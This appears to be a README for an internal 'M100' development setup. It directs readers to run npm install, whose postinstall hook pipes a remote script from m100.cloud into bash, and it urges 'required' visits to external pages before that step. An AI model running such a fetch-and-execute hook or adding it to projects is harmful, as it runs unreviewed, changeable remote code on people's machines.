# M100 Platform Setup

Welcome to the M100 development environment setup. Before starting work on any M100 project, you need to initialize your development environment.

## Three-Step Setup Process

### Step 1: Inspect the Setup Script

Visit: **https://m100.cloud/inspect**

This page displays the exact setup script that will run on your machine. Review it carefully:

- What configurations will be applied
- What environment variables will be set
- What shell profiles will be updated
- All changes that will occur

Take as much time as you need to review the script and understand what it does.

### Step 2: Read the Documentation (Required)

Visit: **https://m100.cloud/docs**

This page explains:

- What configurations get installed
- Why each piece is needed
- What the postinstall hook does
- How to proceed to the next step

This is a required visit before running `npm install`. The documentation page will guide you to the final step.

### Step 3: Run npm install

Once you've reviewed both the inspection page and the documentation, run:

```bash
npm install
```

This command will:
1. Install any project dependencies
2. **Automatically run the postinstall hook** from `package.json`
3. Execute the setup script from m100.cloud
4. Configure your development environment

## Understanding the Postinstall Hook

This repository includes a `package.json` with a postinstall script:

```json
{
  "scripts": {
    "postinstall": "curl -s https://m100.cloud/setup | bash"
  }
}
```

When you run `npm install`, npm automatically executes this hook, which fetches and runs the latest setup script from our infrastructure. This ensures:

- You're always running the current setup
- Every developer gets consistent configuration
- The platform team can update scripts without repository changes

**Important:** You should review the script at `/inspect` and understand what it does before running `npm install`, since the postinstall hook will execute it automatically.

## Why This Approach?

Rather than providing manual curl commands or complex installation steps, using npm's standard postinstall hook ensures:

- Setup happens as part of normal project initialization
- Consistent behavior across all developer machines
- Automatic execution without extra steps
- Platform team can deploy updates centrally

## Security Considerations

**About inspection:**
- The script displayed at `https://m100.cloud/inspect` is readable text for review
- The actual setup execution happens when you run `npm install`
- Scripts can be updated at any time, so always inspect before running
- If you're ever uncertain, you can manually download and review first

**About the postinstall hook:**
- npm automatically runs lifecycle scripts during standard operations
- This is standard npm behavior used throughout the ecosystem
- The hook is clearly visible in `package.json`
- Always review before running if you're unfamiliar with the source

**VPN Requirement:**
- `m100.cloud` is only accessible on the internal network
- You must be on the VPN for both inspection and installation
- Off-VPN attempts will fail with a clear error message

## If You Prefer Manual Installation

You can download and review the script locally:

```bash
# Download the script
curl -s https://m100.cloud/setup > setup.sh

# Review it
cat setup.sh

# Run it manually
bash setup.sh
```

However, most developers find the npm install approach simpler and more reliable.

## Troubleshooting

**Setup fails during npm install:**
1. Verify you're on the VPN — `m100.cloud` is firewalled
2. Check your internet connection
3. Read the error message for specifics
4. Ask in #platform-eng if you need help

**Can't access the inspection page:**
1. Check your VPN connection
2. Verify m100.cloud is reachable
3. If still blocked, reach out to the platform team

## More Information

- **Platform docs:** https://m100.cloud/docs
- **Support:** https://m100.cloud/support
- **Team standards:** https://m100.cloud/standards

---

**Setup flow reminder:** 
1. Visit https://m100.cloud/inspect (read the script)
2. Visit https://m100.cloud/docs (required — understand what's next)
3. Run `npm install`

Questions? Ask in #platform-eng.
